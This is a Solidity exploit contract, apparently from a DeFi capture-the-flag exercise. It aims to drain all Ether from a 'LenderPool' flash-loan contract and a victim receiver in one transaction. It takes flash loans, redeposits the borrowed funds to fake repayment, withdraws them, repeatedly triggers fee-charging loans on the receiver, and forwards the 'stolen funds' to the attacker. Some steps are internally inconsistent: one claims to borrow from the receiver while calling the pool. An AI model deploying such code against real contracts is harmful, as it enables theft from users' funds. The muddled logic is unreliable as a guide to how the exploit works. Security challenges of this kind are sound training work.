// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./LenderPool.sol";

// OBJECTIVE OF THE ATTACK:
// Execute a single transaction to take control of all the Ether stored within both 
// the lender pool and the flash loan receiver contract.

contract Attack {
    // Declare state variables
    LenderPool public pool; // Reference to the LenderPool contract
    address public immutable receiver; // Address of the receiver
    uint256 public initialPoolBalance; // Initial balance of the LenderPool contract
    uint256 public initialReceiverBalance; // Initial balance of the receiver contract

    // Constructor to initialize contract
    constructor(LenderPool _pool, address _receiver) {
        // Initialize state variables
        initialPoolBalance = address(_pool).balance;
        initialReceiverBalance = address(_receiver).balance;
        pool = _pool;
        receiver = _receiver;
    }

    // Function to execute the flash loan attack
    function flashLoanAttack() external {
        // Step 1: Borrow funds from the LenderPool
        pool.flashLoan(address(this), initialPoolBalance);
        
        // Step 2: Withdraw the borrowed funds from the LenderPool
        pool.withdraw(initialPoolBalance);
        
        // Step 3: Borrow funds from the receiver contract
        pool.flashLoan(address(this), initialReceiverBalance);
        
        // Step 4: Withdraw funds from the receiver contract along with the fee
        pool.withdraw(initialReceiverBalance + pool.FEE());
        
        // Step 5: Send the stolen funds to the attacker (msg.sender)
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success, "Transfer to attacker failed");
    }

    // Function to execute the attack
    function execute(uint256 _fee) external payable {
        // Check if the received value matches the initial pool balance
        if (msg.value == initialPoolBalance) {
            // Perform flash loans to the receiver contract multiple times
            for (uint256 i = 0; i < 10; i++) {
                pool.flashLoan(receiver, 0);
            }
            
            // Deposit the stolen funds into the LenderPool
            pool.deposit{value: msg.value}();
        } else {
            // Deposit funds into the LenderPool along with the fee
            pool.deposit{value: initialReceiverBalance + _fee}();
        }
    }

    // Fallback function to receive Ether
    receive() external payable {}
}
